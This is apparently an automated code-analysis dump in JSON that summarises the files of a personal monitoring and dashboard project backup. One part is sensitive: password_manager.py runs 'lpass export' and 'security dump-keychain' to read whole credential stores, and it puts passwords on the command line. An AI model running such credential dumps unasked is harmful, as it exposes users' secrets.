          "# Sort by CPU percent and return top N"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 19,
        "decorators": [
          "@cached(ttl_seconds=5)",
          "@cached(ttl_seconds=5)",
          "@cached(ttl_seconds=30)",
          "@cached(ttl_seconds=5)",
          "@cached(ttl_seconds=5)"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/test.py",
        "docstrings": [],
        "function_defs": [
          "def hello():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/test_logging.py",
        "docstrings": [],
        "function_defs": [
          "def before_request():",
          "def after_request(response):",
          "def home():",
          "def test():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "import logging"
        ],
        "comments": [
          "# Set up logging",
          "# Create Flask app",
          "# Add before/after request logging"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.before_request",
          "@app.after_request",
          "@app.route('/')",
          "@app.route('/test')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/test_services.py",
        "docstrings": [],
        "function_defs": [
          "def test_configuration():\n\"\"\"Test configuration system.\"\"\"\nlogger.info(\"Testing configuration...\")\n\n# Check directory structure\ndirs_to_check = [\nservice_config.log_dir,\nservice_config.state_dir,\nservice_config.config_dir\n]",
          "def test_service_registry():\n\"\"\"Test service registry functionality.\"\"\"\nlogger.info(\"Testing service registry...\")\n\n# Register test service\nservice_registry.register_service('test_service', TestService)\n\n# Start service\nsuccess = service_registry.start_service('test_service')\nassert success, \"Failed to start test service\"",
          "def test_error_recovery():\n\"\"\"Test error recovery mechanisms.\"\"\"\nlogger.info(\"Testing error recovery...\")\n\n# Start service\nservice_registry.start_service('test_service')\n\n# Wait for error (occurs every 10 iterations)\nlogger.info(\"Waiting for error condition...\")\ntime.sleep(12)  # Ensure we hit an error",
          "def main():\n\"\"\"Run all tests.\"\"\"\ntry:\ntest_configuration()\ntest_service_registry()\ntest_error_recovery()\n\nlogger.info(\"All tests passed!\")\nreturn 0\n"
        ],
        "class_defs": [],
        "imports": [
          "import time",
          "import json",
          "from pathlib import Path",
          "import logging",
          "from src.config.service_config import service_config",
          "from src.services.service_registry import service_registry",
          "from src.services.test_service import TestService"
        ],
        "comments": [
          "# Set up logging",
          "# Check directory structure",
          "# Check config loading",
          "# Register test service",
          "# Start service",
          "# Check status",
          "# Wait for some iterations",
          "# Check state file",
          "# Stop service",
          "# Start service",
          "# Wait for error (occurs every 10 iterations)",
          "# Check recovery",
          "# Stop service"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/test_socket.py",
        "docstrings": [],
        "function_defs": [
          "def hello():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "from werkzeug.serving import run_simple",
          "import socket",
          "import os"
        ],
        "comments": [
          "# Remove socket if it already exists",
          "# Create Unix domain socket",
          "# Run Flask with Unix socket"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/test_waitress.py",
        "docstrings": [],
        "function_defs": [
          "def hello():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "from waitress import serve"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/warp_commander.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config: dict):",
          "def _generate_core_commands(self) -> List[str]:\n\"\"\"Generate commands for core infrastructure development\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/monitor.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/password_manager.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/docker_manager.py\"\n]\n\ndef _generate_ai_commands(self) -> List[str]:\n\"\"\"Generate commands for AI development\"\"\"",
          "def _generate_ai_commands(self) -> List[str]:\n\"\"\"Generate commands for AI development\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/ai/system_brain.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/ai/model_trainer.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/ai/pattern_analyzer.py\"\n]\n\ndef _generate_automation_commands(self) -> List[str]:\n\"\"\"Generate commands for automation development\"\"\"",
          "def _generate_automation_commands(self) -> List[str]:\n\"\"\"Generate commands for automation development\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/automation/controller.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/automation/task_scheduler.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/automation/safety_monitor.py\"\n]\n\ndef _generate_evolution_commands(self) -> List[str]:\n\"\"\"Generate commands for system evolution\"\"\"",
          "def _generate_evolution_commands(self) -> List[str]:\n\"\"\"Generate commands for system evolution\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/evolution/consciousness.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/evolution/adaptor.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/evolution/optimizer.py\"\n]\n\nasync def execute_commands(self, commands: List[str]):\n\"\"\"Execute commands through Warp\"\"\"",
          "def _log_execution(self, command: str, stdout: bytes, stderr: bytes):\n\"\"\"Log command execution results\"\"\"\ntry:\nself.command_history.append({\n\"timestamp\": datetime.now().isoformat(),\n\"command\": command,\n\"stdout\": stdout.decode() if stdout else \"\",\n\"stderr\": stderr.decode() if stderr else \"\",\n\"phase\": self.current_phase\n})",
          "def _save_history(self):\n\"\"\"Save command execution history\"\"\"\ntry:\nhistory_path = Path(\"/Volumes/Mac Mini External/MemoryCore/logs/command_history.json\")\nhistory_path.parent.mkdir(parents=True, exist_ok=True)\n\nwith open(history_path, 'w') as f:\njson.dump(self.command_history, f, indent=2)\n\nexcept Exception as e:"
        ],
        "class_defs": [
          "class WarpCommander:"
        ],
        "imports": [
          "import asyncio",
          "import logging",
          "import json",
          "from datetime import datetime",
          "from pathlib import Path",
          "from typing import Dict, List"
        ],
        "comments": [
          "# Execute command",
          "# Wait for completion",
          "# Log results",
          "# Save history periodically",
          "# Generate commands for current phase",
          "# Execute commands",
          "# Move to next phase",
          "# Brief pause between phases",
          "# Check completion status",
          "# Run monitoring in parallel with development"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 12,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/docs/generate_docs.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, base_path: str):",
          "def generate_all(self):\n\"\"\"Generate all documentation.\"\"\"\ntry:\nself.generate_architecture_docs()\nself.generate_api_docs()\nself.generate_deployment_docs()\nself.generate_troubleshooting_docs()\nself.generate_index()\n\nlogger.info(\"Documentation generation completed successfully\")",
          "def generate_architecture_docs(self):\n\"\"\"Generate system architecture documentation.\"\"\"\nlogger.info(\"Generating architecture documentation\")\n\ncontent = [\n\"# System Architecture\\n\",\n\"## Overview\\n\",\n\"The dashboard system consists of several key components working together \",\n\"to provide real-time monitoring and visualization capabilities.\\n\",\n",
          "def generate_api_docs(self):\n\"\"\"Generate API documentation.\"\"\"\nlogger.info(\"Generating API documentation\")\n\ncontent = [\n\"# API Documentation\\n\",\n\"## Overview\\n\",\n\"The dashboard provides a RESTful API for interacting with the system.\\n\\n\",\n\"## Authentication\\n\",\n\"API requests require authentication using a Bearer token:\\n\",",
          "def generate_deployment_docs(self):\n\"\"\"Generate deployment documentation.\"\"\"\nlogger.info(\"Generating deployment documentation\")\n\ncontent = [\n\"# Deployment Guide\\n\",\n\"## Prerequisites\\n\",\n\"- Python 3.9 or higher\\n\",\n\"- System dependencies listed in requirements.txt\\n\",\n\"- Access to deployment environment\\n\\n\",",
          "def generate_troubleshooting_docs(self):\n\"\"\"Generate troubleshooting documentation.\"\"\"\nlogger.info(\"Generating troubleshooting documentation\")\n\ncontent = [\n\"# Troubleshooting Guide\\n\",\n\"## Common Issues\\n\"\n]\n\n# Document common issues and solutions",
          "def generate_index(self):\n\"\"\"Generate documentation index.\"\"\"\nlogger.info(\"Generating documentation index\")\n\ncontent = [\n\"# Dashboard Documentation\\n\",\nf\"Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n\\n\",\n\"## Contents\\n\",\n\"- [System Architecture](architecture.md)\\n\",\n\"- [API Documentation](api.md)\\n\",",
          "def _analyze_components(self) -> List[Dict[str, Any]]:\n\"\"\"Analyze system components from source code.\"\"\"\ncomponents = []\n\nfor py_file in self.src_dir.rglob('*.py'):\ntry:\nwith open(py_file) as f:\ncontent = f.read()\n\ntree = ast.parse(content)",
          "def _extract_features(self, node: ast.ClassDef) -> List[str]:\n\"\"\"Extract key features from class methods.\"\"\"\nfeatures = []\n\nfor child in node.body:\nif isinstance(child, ast.FunctionDef):\ndoc = ast.get_docstring(child)\nif doc and not child.name.startswith('_'):\nfeatures.append(f\"{child.name}: {doc.split('.')[0]}\")\n",
          "def _extract_interfaces(self, node: ast.ClassDef) -> List[str]:\n\"\"\"Extract public interfaces from class.\"\"\"\ninterfaces = []\n\nfor child in node.body:\nif isinstance(child, ast.FunctionDef):\nif not child.name.startswith('_'):\nargs = [arg.arg for arg in child.args.args[1:]]  # Skip self\ninterfaces.append(\nf\"{child.name}({', '.join(args)})\"",
          "def _extract_dependencies(self, node: ast.ClassDef) -> List[str]:\n\"\"\"Extract dependencies from class imports.\"\"\"\ndependencies = []\n\n# Look at module level imports\nmodule = node.parent\nif isinstance(module, ast.Module):\nfor child in module.body:\nif isinstance(child, (ast.Import, ast.ImportFrom)):\nif isinstance(child, ast.Import):",
          "def _analyze_data_flow(self) -> List[Dict[str, Any]]:\n\"\"\"Analyze system data flow.\"\"\"\n# This would typically be based on actual system analysis\n# Here's a simplified example\nreturn [\n{\n'name': 'Data Collection',\n'description': 'System metrics and events are collected from various sources'\n},\n{",
          "def _analyze_endpoints(self) -> List[Dict[str, Any]]:\n\"\"\"Analyze API endpoints from route definitions.\"\"\"\nendpoints = []\n\n# Look for FastAPI/Flask route decorators\nfor py_file in (self.src_dir / 'api').rglob('*.py'):\ntry:\nwith open(py_file) as f:\ncontent = f.read()\n",
          "def _parse_endpoint(",
          "def _load_deploy_config(self) -> Dict[str, Any]:\n\"\"\"Load deployment configuration.\"\"\"\nconfig_file = self.base_path / 'deploy/config.json'\nif config_file.exists():\nwith open(config_file) as f:\nreturn json.load(f)\nreturn {}\n\ndef _collect_known_issues(self) -> Dict[str, List[Dict[str, Any]]]:\n\"\"\"Collect known issues and solutions.\"\"\"",
          "def _collect_known_issues(self) -> Dict[str, List[Dict[str, Any]]]:\n\"\"\"Collect known issues and solutions.\"\"\"\nreturn {\n'Performance': [\n{\n'problem': 'High CPU Usage',\n'symptoms': 'Dashboard response time is slow, system resources are strained',\n'causes': [\n'Too many concurrent connections',\n'Inefficient query patterns',",
          "def _write_doc(self, filename: str, content: List[str]):\n\"\"\"Write documentation to file.\"\"\"\noutput_file = self.output_dir / filename\nwith open(output_file, 'w') as f:\nf.write(''.join(content))\nlogger.info(f\"Generated {filename}\")\n\ndef main():\n\"\"\"Generate documentation based on command line arguments.\"\"\"",
          "def main():\n\"\"\"Generate documentation based on command line arguments.\"\"\"\nimport argparse\n\nparser = argparse.ArgumentParser(description='Generate dashboard documentation')\nparser.add_argument(\n'--type',\nchoices=['all', 'architecture', 'api', 'deployment', 'troubleshooting'],\ndefault='all',\nhelp='Type of documentation to generate'"
        ],
        "class_defs": [
          "class DocGenerator:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import subprocess",
          "import logging",
          "from pathlib import Path",
          "from typing import List, Dict, Any",
          "import json",
          "import ast",
          "import inspect",
          "import re",
          "import mistune",
          "from datetime import datetime",
          "import argparse"
        ],
        "comments": [
          "# Ensure directories exist",
          "# Initialize Markdown renderer",
          "# Document main components",
          "# Document system interactions",
          "# Generate Mermaid.js diagram",
          "# Document data flow",
          "# Document API endpoints",
          "# Document deployment environments",
          "# Document deployment steps",
          "# Document common issues and solutions",
          "# Extract class documentation and structure",
          "# Look at module level imports",
          "# This would typically be based on actual system analysis",
          "# Here's a simplified example",
          "# Look for FastAPI/Flask route decorators",
          "# Extract HTTP method and path from decorator",
          "# Parse parameters from function arguments",
          "# Create a sample response based on return annotation"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 8,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/system_monitor/docker_manager.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config: dict):",
          "def _get_service_info(self, container) -> Dict:\n\"\"\"Get detailed service information\"\"\"\ntry:\nreturn {\n'id': container.id,\n'name': container.name,\n'status': container.status,\n'health': getattr(container, 'health', 'N/A'),\n'image': container.image.tags[0] if container.image.tags else 'none',\n'created': container.attrs['Created'],",
          "def _needs_credential_rotation(self, service_name: str) -> bool:\n\"\"\"Check if service credentials need rotation\"\"\"\n# Implement credential rotation check logic\nreturn False\n\nasync def _rotate_service_credentials(self, service_name: str):\n\"\"\"Rotate service credentials\"\"\""
        ],
        "class_defs": [
          "class DockerManager:"
        ],
        "imports": [
          "import docker",
          "import logging",
          "import json",
          "import asyncio",
          "from typing import Dict, List, Optional",
          "from datetime import datetime"
        ],
        "comments": [
          "# Check health status",
          "# Store health check result",
          "# Update service credentials",
          "# Implement credential rotation check logic",
          "# Implement credential rotation logic",
          "# Try to restart the container",
          "# Wait for container to stabilize",
          "# Check if healing was successful",
          "# Save backup"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 14,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/system_monitor/monitor.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config_path: str):",
          "def _load_config(self, path: str) -> dict:",
          "def setup_logging(self):",
          "def main():"
        ],
        "class_defs": [
          "class SystemMonitor:"
        ],
        "imports": [
          "import yaml",
          "import logging",
          "import asyncio",
          "import docker",
          "import keyring",
          "import os",
          "import sys",
          "from datetime import datetime",
          "from typing import Dict, List, Any",
          "from pathlib import Path",
          "import psutil"
        ],
        "comments": [
          "# Set up logging based on config",
          "# Check thresholds",
          "# Check authentication logs",
          "# Monitor failed login attempts",
          "# Check system integrity",
          "# Verify service permissions",
          "# Scan for new services",
          "# Implement service discovery logic"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 10,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/system_monitor/password_manager.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config: dict):",
          "def _get_lastpass_entries(self) -> Dict:\n\"\"\"Get entries from LastPass\"\"\"\ntry:\n# Use lastpass-cli to get entries\nresult = subprocess.run(\n['lpass', 'export'],\ncapture_output=True,\ntext=True\n)\nreturn json.loads(result.stdout)",
          "def _get_keychain_entries(self) -> Dict:\n\"\"\"Get entries from macOS Keychain\"\"\"\ntry:\n# Use security command-line tool to get entries\nresult = subprocess.run(\n['security', 'dump-keychain'],\ncapture_output=True,\ntext=True\n)\n# Parse the output and return structured data",
          "def _sync_entries(self, lastpass: Dict, keychain: Dict):\n\"\"\"Synchronize entries between LastPass and Keychain\"\"\"\ntry:\n# Compare and update entries\nfor service, lp_entry in lastpass.items():\nif service not in keychain:\n# Add to Keychain\nself._add_to_keychain(service, lp_entry)\nelif self._needs_update(lp_entry, keychain[service]):\n# Update Keychain",
          "def _add_to_keychain(self, service: str, entry: Dict):\n\"\"\"Add entry to macOS Keychain\"\"\"\ntry:\nkeyring.set_password(\nservice,\nentry['username'],\nentry['password']\n)\nself.logger.info(f\"Added {service} to Keychain\")\nexcept Exception as e:",
          "def _update_keychain(self, service: str, entry: Dict):\n\"\"\"Update entry in macOS Keychain\"\"\"\ntry:\nkeyring.set_password(\nservice,\nentry['username'],\nentry['password']\n)\nself.logger.info(f\"Updated {service} in Keychain\")\nexcept Exception as e:",
          "def _add_to_lastpass(self, service: str, entry: Dict):\n\"\"\"Add entry to LastPass\"\"\"\ntry:\n# Use lastpass-cli to add entry\nsubprocess.run([\n'lpass', 'add',\n'--non-interactive',\n'--sync=now',\nf\"--username={entry['username']}\",\nf\"--password={entry['password']}\",",
          "def _needs_update(self, lp_entry: Dict, kc_entry: Dict) -> bool:\n\"\"\"Check if entry needs updating\"\"\"\nreturn (\nlp_entry['username'] != kc_entry['username'] or\nlp_entry['password'] != kc_entry['password']\n)\n\ndef _parse_keychain_output(self, output: str) -> Dict:\n\"\"\"Parse keychain command output into structured data\"\"\"",
          "def _parse_keychain_output(self, output: str) -> Dict:\n\"\"\"Parse keychain command output into structured data\"\"\"\n# Implement parsing logic here\n# This is a placeholder that needs to be implemented\n# based on the actual output format\nreturn {}\n\nasync def rotate_passwords(self):\n\"\"\"Implement password rotation logic\"\"\""
        ],
        "class_defs": [
          "class PasswordManager:"
        ],
        "imports": [
          "import keyring",
          "import subprocess",
          "import json",
          "import logging",
          "from typing import Dict, Optional",
          "from datetime import datetime"
        ],
        "comments": [
          "# Get LastPass entries",
          "# Get Keychain entries",
          "# Sync entries",
          "# Use lastpass-cli to get entries",
          "# Use security command-line tool to get entries",
          "# Parse the output and return structured data",
          "# Compare and update entries",
          "# Add to Keychain",
          "# Update Keychain",
          "# Handle Keychain entries not in LastPass",
          "# Add to LastPass",
          "# Use lastpass-cli to add entry",
          "# Implement parsing logic here",
          "# This is a placeholder that needs to be implemented",
          "# based on the actual output format",
          "# To be implemented based on rotation rules",
          "# To be implemented"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 14,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/tests/conftest.py",
        "docstrings": [],
        "function_defs": [
          "def test_dir() -> Generator[Path, None, None]:\n\"\"\"Create a temporary test directory.\"\"\"\nwith tempfile.TemporaryDirectory() as temp_dir:\nyield Path(temp_dir)\n\n@pytest.fixture(scope='session')\ndef mock_metrics() -> Dict[str, Any]:\n\"\"\"Create mock system metrics.\"\"\"",
          "def mock_metrics() -> Dict[str, Any]:\n\"\"\"Create mock system metrics.\"\"\"\nreturn {\n'cpu': {\n'percent': 50.0,\n'count': 8,\n'count_logical': 16,\n'per_cpu': [45.0, 55.0, 48.0, 52.0, 47.0, 53.0, 46.0, 54.0],\n'load_avg': [2.5, 2.7, 2.6]\n},",
          "def mock_system_info() -> Dict[str, Any]:\n\"\"\"Create mock system information.\"\"\"\nreturn {\n'os': 'Darwin',\n'version': '21.6.0',\n'arch': 'x86_64',\n'hostname': 'test-host',\n'uptime': 86400,  # 1 day\n'boot_time': 1625097600,  # 2021-07-01 00:00:00\n'users': [",
          "def mock_health_check(test_dir: Path) -> HealthCheck:\n\"\"\"Create a mock health check instance.\"\"\"\nhealth_check = HealthCheck(test_dir)\nhealth_check._get_system_metrics = MagicMock(return_value=mock_metrics())\nhealth_check._get_system_info = MagicMock(return_value=mock_system_info())\nreturn health_check\n\n@pytest.fixture\ndef mock_data_processor(test_dir: Path) -> DataProcessor:\n\"\"\"Create a mock data processor instance.\"\"\"",
          "def mock_data_processor(test_dir: Path) -> DataProcessor:\n\"\"\"Create a mock data processor instance.\"\"\"\nprocessor = DataProcessor(test_dir)\nprocessor.get_metrics = MagicMock(return_value=mock_metrics())\nreturn processor\n\n@pytest.fixture\ndef mock_memory_enhancer(test_dir: Path) -> MemoryEnhancer:\n\"\"\"Create a mock memory enhancer instance.\"\"\"",
          "def mock_memory_enhancer(test_dir: Path) -> MemoryEnhancer:\n\"\"\"Create a mock memory enhancer instance.\"\"\"\nenhancer = MemoryEnhancer(test_dir)\nreturn enhancer\n\n@pytest.fixture\ndef mock_logger():\n\"\"\"Create a mock logger instance.\"\"\"",
          "def mock_logger():\n\"\"\"Create a mock logger instance.\"\"\"\nreturn logging.getLogger('test')\n\n@pytest.fixture\ndef sample_service_data() -> Dict[str, Any]:\n\"\"\"Create sample service data for testing.\"\"\"",
          "def sample_service_data() -> Dict[str, Any]:\n\"\"\"Create sample service data for testing.\"\"\"\nreturn {\n'services': {\n'test_service_1': {\n'name': 'test_service_1',\n'status': 'running',\n'uptime': 3600,\n'memory_usage': 100 * 1024 * 1024,  # 100MB\n'cpu_usage': 5.0,",
          "def sample_timeline_data() -> Dict[str, Any]:\n\"\"\"Create sample timeline data for testing.\"\"\"\nreturn {\n'timeline': {\n'2025-09': [\n{\n'date': '2025-09-01T00:00:00',\n'type': 'service_start',\n'component': 'test_service_1',\n'description': 'Service started successfully'",
          "def sample_config_data() -> Dict[str, Any]:\n\"\"\"Create sample configuration data for testing.\"\"\"\nreturn {\n'monitoring': {\n'interval': 60,\n'metrics': ['cpu', 'memory', 'disk', 'network'],\n'thresholds': {\n'cpu_percent': 80,\n'memory_percent': 90,\n'disk_percent': 85",
          "def pytest_configure(config):\n\"\"\"Configure test environment.\"\"\"\nos.environ['TESTING'] = 'true'\n\ndef pytest_unconfigure(config):\n\"\"\"Cleanup test environment.\"\"\"",
          "def pytest_unconfigure(config):\n\"\"\"Cleanup test environment.\"\"\"\nos.environ.pop('TESTING', None)\n"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import pytest",
          "import tempfile",
          "from pathlib import Path",
          "from typing import Generator, Dict, Any",
          "import psutil",
          "import json",
          "import logging",
          "from unittest.mock import MagicMock",
          "from ..src.utils.logging_config import setup_logging",
          "from ..src.utils.health_check import HealthCheck",
          "from ..src.core.data_processor import DataProcessor",
          "from ..src.memory.memory_enhancer import MemoryEnhancer"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@pytest.fixture(scope='session')",
          "@pytest.fixture(scope='session')",
          "@pytest.fixture(scope='session')",
          "@pytest.fixture",
          "@pytest.fixture",
          "@pytest.fixture",
          "@pytest.fixture",
          "@pytest.fixture",
          "@pytest.fixture",
          "@pytest.fixture"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/tests/test_autonomous_supervisor.py",
        "docstrings": [],
        "function_defs": [
          "def setUp(self):\n\"\"\"Set up test environment.\"\"\"\n# Set up logging\nlogging.basicConfig(level=logging.DEBUG)\nself.logger = logging.getLogger('TestAutonomousSupervisor')\n\n# Create temp dir for test files\nself.test_dir = Path(tempfile.mkdtemp())\nself.test_service_dir = self.test_dir / 'services'\nself.test_service_dir.mkdir(parents=True)",
          "def tearDown(self):\n\"\"\"Clean up test environment.\"\"\"\n# Stop supervisor\nif self.supervisor:\nself.supervisor.stop()\ntime.sleep(0.1)  # Brief pause for cleanup\n\n# Remove test directory\nshutil.rmtree(self.test_dir)\n",
          "def test_initialization(self):\n\"\"\"Test supervisor initialization.\"\"\"\nself.assertIsNotNone(self.supervisor)\nself.assertEqual(self.supervisor.service_dir, self.test_service_dir)\nself.assertFalse(self.supervisor.running)\nself.assertTrue(self.supervisor.task_queue.empty())\n\ndef test_task_queue_priority(self):\n\"\"\"Test task queue prioritization.\"\"\"",
          "def test_task_queue_priority(self):\n\"\"\"Test task queue prioritization.\"\"\"\n# Add tasks with different priorities\nself.supervisor.add_task(3, 'low_priority_task')\nself.supervisor.add_task(1, 'high_priority_task')\nself.supervisor.add_task(2, 'medium_priority_task')\n\n# Check task order\ntask1 = self.supervisor.task_queue.get()\ntask2 = self.supervisor.task_queue.get()",
          "def test_task_sequence(self):\n\"\"\"Test task sequence handling.\"\"\"\nsequence = [\n(1, 'task1', {'param': 'value1'}),\n(2, 'task2', {'param': 'value2'}),\n(3, 'task3', {'param': 'value3'})\n]\n\nself.supervisor.add_sequence(sequence)\n",
          "def test_error_handling(self):\n\"\"\"Test error handling and retries.\"\"\"\nwith patch.object(self.supervisor, '_execute_task', side_effect=Exception(\"Test error\")):\nself.supervisor.start()\nself.supervisor.add_task(1, 'failing_task')\n\n# Wait for retries\ntime.sleep(0.5)\n\n# Should have tried 3 times",
          "def test_comprehensive_task_flow(self):\n\"\"\"Test a complete task processing workflow.\"\"\"\n# Add multiple tasks\nself.supervisor.add_sequence([\n(1, 'task1', {'step': 1}),\n(2, 'task2', {'step': 2}),\n(3, 'task3', {'step': 3})\n])\n\n# Mock task execution",
          "def test_task_cancellation(self):\n\"\"\"Test ability to cancel tasks.\"\"\"\n# Add a long-running task\ntask_id = 'test_task'\nself.supervisor.add_task(1, task_id, {'duration': 5})\n\n# Start processing\nself.supervisor.start()\ntime.sleep(0.1)  # Let task start\n"
        ],
        "class_defs": [
          "class TestAutonomousSupervisor(unittest.TestCase):"
        ],
        "imports": [
          "import unittest",
          "import time",
          "import logging",
          "import tempfile",
          "import shutil",
          "from pathlib import Path",
          "from unittest.mock import patch, MagicMock",
          "from src.services.autonomous_supervisor import AutonomousSupervisor"
        ],
        "comments": [
          "# Set up logging",
          "# Create temp dir for test files",
          "# Create supervisor instance",
          "# Stop supervisor",
          "# Remove test directory",
          "# Remove logging handlers",
          "# Add tasks with different priorities",
          "# Check task order",
          "# Check task order and parameters",
          "# Wait for retries",
          "# Should have tried 3 times",
          "# Add multiple tasks",
          "# Mock task execution",
          "# Start supervisor",
          "# Wait for all tasks to be processed",
          "# Check all tasks were executed",
          "# Verify task order",
          "# Add a long-running task",
          "# Start processing",
          "# Cancel task",
          "# Verify task was cancelled"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/tests/test_health_check.py",
        "docstrings": [],
        "function_defs": [
          "def test_health_check_initialization(test_dir: Path):\n\"\"\"Test health check initialization.\"\"\"\nhealth_check = HealthCheck(test_dir)\nassert health_check.base_path == test_dir\nassert (test_dir / 'health').exists()\n\ndef test_check_system_resources(mock_health_check, mock_metrics):\n\"\"\"Test system resource checking.\"\"\"",
          "def test_check_system_resources(mock_health_check, mock_metrics):\n\"\"\"Test system resource checking.\"\"\"\nresources = mock_health_check.check_system_resources()\nassert resources['memory']['healthy'] is True\nassert resources['cpu']['healthy'] is True\nassert resources['disk']['healthy'] is True\n\ndef test_check_component_health(mock_health_check):\n\"\"\"Test component health checking.\"\"\"",
          "def test_check_component_health(mock_health_check):\n\"\"\"Test component health checking.\"\"\"\ndef mock_check():\nreturn {'status': 'healthy', 'uptime': 3600}\n\nresult = mock_health_check.check_component_health('test_component', mock_check)\nassert result['healthy'] is True\nassert result['error'] is None\nassert 'response_time' in result\n",
          "def mock_check():",
          "def test_get_system_health(mock_health_check):\n\"\"\"Test overall system health status.\"\"\"\nstatus = mock_health_check.get_system_health()\nassert status['healthy'] is True\nassert 'system_resources' in status\nassert 'error_stats' in status\nassert 'components' in status\n\ndef test_save_health_status(mock_health_check, test_dir):\n\"\"\"Test health status saving.\"\"\"",
          "def test_save_health_status(mock_health_check, test_dir):\n\"\"\"Test health status saving.\"\"\"\nstatus = {\n'timestamp': '2025-09-07T04:23:00Z',\n'healthy': True,\n'components': {}\n}\nmock_health_check._save_health_status(status)\n\nstatus_file = test_dir / 'health/health_status.json'",
          "def test_error_handling(mock_health_check):\n\"\"\"Test error handling in health checks.\"\"\"\ndef failing_check():\nraise Exception(\"Test error\")\n\nresult = mock_health_check.check_component_health('test_component', failing_check)\nassert result['healthy'] is False\nassert 'Test error' in result['error']\n\ndef test_threshold_monitoring(mock_health_check, mock_metrics):",
          "def failing_check():",
          "def test_threshold_monitoring(mock_health_check, mock_metrics):\n\"\"\"Test threshold monitoring.\"\"\"\n# Simulate high CPU usage\nwith patch.dict(mock_metrics, {'cpu': {'percent': 95.0}}):\nmock_health_check._get_system_metrics = MagicMock(return_value=mock_metrics)\nresources = mock_health_check.check_system_resources()\nassert resources['cpu']['healthy'] is False\n\ndef test_component_status_history(mock_health_check, test_dir):\n\"\"\"Test component status history tracking.\"\"\"",
          "def test_component_status_history(mock_health_check, test_dir):\n\"\"\"Test component status history tracking.\"\"\"\ncomponent_name = 'test_component'\n\n# Generate some test history\nfor i in range(3):\nstatus = {\n'healthy': True if i % 2 == 0 else False,\n'timestamp': f'2025-09-07T04:23:{i:02d}Z',\n'error': None if i % 2 == 0 else 'Test error'",
          "def test_resource_threshold_configuration(test_dir):\n\"\"\"Test resource threshold configuration.\"\"\"\ncustom_thresholds = {\n'cpu_percent': 70.0,\n'memory_percent': 80.0,\n'disk_percent': 75.0\n}\n\nhealth_check = HealthCheck(test_dir, thresholds=custom_thresholds)\nassert health_check.thresholds == custom_thresholds",
